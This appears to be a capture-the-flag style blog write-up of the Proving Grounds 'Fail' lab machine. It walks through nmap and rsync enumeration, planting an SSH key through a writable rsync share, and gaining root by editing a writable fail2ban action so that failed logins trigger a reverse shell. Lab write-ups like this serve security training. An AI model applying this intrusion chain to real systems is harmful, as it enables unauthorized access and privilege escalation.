---
layout: post
title: PG | Fail
subtitle: You shall not pass.
---

# Nmap Scan Results

~~~
Starting Nmap 7.94 ( https://nmap.org ) at 2023-10-24 16:26 UTC
Nmap scan report for 192.168.194.126
Host is up (0.015s latency).
Not shown: 65533 closed tcp ports (reset)
PORT    STATE SERVICE VERSION
22/tcp  open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey: 
|   2048 74:ba:20:23:89:92:62:02:9f:e7:3d:3b:83:d4:d9:6c (RSA)
|   256 54:8f:79:55:5a:b0:3a:69:5a:d5:72:39:64:fd:07:4e (ECDSA)
|_  256 7f:5d:10:27:62:ba:75:e9:bc:c8:4f:e2:72:87:d4:e2 (ED25519)
873/tcp open  rsync   (protocol version 31)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 27.36 seconds
~~~

# Service Enumeration

## Rsync (TCP/873)
Rsync is a directory sharing protocol used on Unix systems

The protocol can be scanned for available folders using an nmap script
~~~
nmap -sV --script "rsync-list-modules" -p 873 192.168.194.126
~~~
~~~
PORT    STATE SERVICE VERSION
873/tcp open  rsync   (protocol version 31)
| rsync-list-modules: 
|_  fox                 fox home
~~~

The contents of the fox folder revealed the contents of an empty home directory
~~~
rsync -av --list-only rsync://192.168.194.126/fox
~~~
~~~
receiving incremental file list
drwxr-xr-x          4,096 2021/01/21 14:21:59 .
lrwxrwxrwx              9 2020/12/03 20:22:42 .bash_history -> /dev/null
-rw-r--r--            220 2019/04/18 04:12:36 .bash_logout
-rw-r--r--          3,526 2019/04/18 04:12:36 .bashrc
-rw-r--r--            807 2019/04/18 04:12:36 .profile

sent 20 bytes  received 136 bytes  312.00 bytes/sec
total size is 4,562  speedup is 29.24
~~~

The contents of the fox folder can be retrieved and stored locally using the command
~~~
rsync -av rsync://192.168.194.126/fox ./rsyn_shared
~~~
These files reveal no useful information to further our progress.

Rsync also allows us to upload files, therefore we can generate a SSH key (as we have seen SSH TCP port 22 is enabled), then upload to the key to the machine using Rsync to
give us a remote connection to the machine.

# Exploitation

1. Generate SSH Key
~~~
┌──(kali㉿kali)-[~/Desktop/Fail]
└─$ ssh-keygen                                       
Generating public/private rsa key pair.
Enter file in which to save the key (/home/kali/.ssh/id_rsa): 
Enter passphrase (empty for no passphrase): 
Enter same passphrase again: 
Your identification has been saved in /home/kali/.ssh/id_rsa
Your public key has been saved in /home/kali/.ssh/id_rsa.pub
The key fingerprint is:
SHA256:LvQfnvR+8TxNBfJBl+4vlOWFvrQu5HBkN6lzYPVXszk kali@kali
The key's randomart image is:
+---[RSA 3072]----+
|             .. o|
|            . ++.|
|             +.*=|
|            = *E*|
|      . S  + =.==|
|     . o  . = B.o|
|      . o o= = Bo|
|       . + +o =.=|
|          +.o+...|
+----[SHA256]-----+
~~~

2. Copy our .ssh directory locally
~~~
cp -R /home/kali/.ssh .
~~~

3. Rename id_rsa.pub (our public key) to authorized_keys before transferring to the target
~~~
┌──(kali㉿kali)-[~/Desktop/Fail]
└─$ cd .ssh
┌──(kali㉿kali)-[~/Desktop/Fail/.ssh]
└─$ mv id_rsa.pub authorized_keys
~~~

4. Upload the .ssh file (containing authorized_keys) to Rsync
~~~
rsync -av /home/kali/Desktop/Fail/.ssh rsync://fox@192.168.194.126/fox
~~~

5. SSH into the target machine
~~~
┌──(kali㉿kali)-[~/Desktop/Fail/.ssh]
└─$ ssh -i ./id_rsa fox@192.168.194.126
The authenticity of host '192.168.194.126 (192.168.194.126)' can't be established.
ED25519 key fingerprint is SHA256:mqPCrimr9j626KOGoHM+qxgHUOYD4pu1+4KzhIvu5uA.
This host key is known by the following other names/addresses:
    ~/.ssh/known_hosts:37: [hashed name]
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '192.168.194.126' (ED25519) to the list of known hosts.
Linux fail 4.19.0-12-amd64 #1 SMP Debian 4.19.152-1 (2020-10-18) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
$ id
uid=1000(fox) gid=1001(fox) groups=1001(fox),1000(fail2ban)
$ 
~~~

# Privilege Escalation

After running Linpeas.sh a directory /etc/fail2ban was identified which is writable by our user

~~~
╔══════════╣ Interesting GROUP writable files (not in Home) (max 500)
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#writable-files                                                                                            
  Group fail2ban:                                                                                                                                                            
/etc/fail2ban/action.d                                                                                                                                                       
/etc/fail2ban/action.d/firewallcmd-ipset.conf
/etc/fail2ban/action.d/nftables-multiport.conf
/etc/fail2ban/action.d/firewallcmd-multiport.conf
/etc/fail2ban/action.d/mail-whois.conf
/etc/fail2ban/action.d/ufw.conf
#)You_can_write_even_more_files_inside_last_directory
~~~

A manual verification of this vulnerability was ran which identified full Read, Write, Execute (RWX) permissions over a file named action.d which is ran by Root

~~~
$ find /etc -writable -ls 2>/dev/null
   787482      4 drwxrwxr-x   2 root     fail2ban     4096 Dec  3  2020 /etc/fail2ban/action.d
~~~

After researching exploits for Fail2Ban an exploit I discovered an exploit within /etc/fail2ban/jail.conf [Exploit](https://systemweakness.com/privilege-escalation-with-fail2ban-nopasswd-d3a6ee69db49)

Inspecting /etc/fail2ban/jail.conf shows that Fail2Ban is configured to only allow 2 attempts before performing the banaction (maxretry) as shown below
![Fail](/assets/img/Fail(1).jpg)

Further down it shows the banaction executes iptables-multiport, we have read-write permissions over iptables-multiport.conf as shown below
![Fail](/assets/img/Fail(2).jpg)

We then change the iptables-multiport.conf file's actionban= to include a reverse shell
Before
![Fail](/assets/img/Fail(3).jpg)
After
![Fail](/assets/img/Fail(4).jpg)

Start a listener on port 80

Attempt to log in with invalid credentials to execute the Fail2Ban and execute our reverse shell
┌──(kali㉿kali)-[~]
└─$ ssh root@192.168.194.126                    
root@192.168.194.126's password: 
Permission denied, please try again.
root@192.168.194.126's password: 
Permission denied, please try again.
root@192.168.194.126's password: 
root@192.168.194.126: Permission denied (publickey,password).

We then recieve our root shell on the netcat listener on port 80

![Fail](/assets/img/Fail(5).jpg)
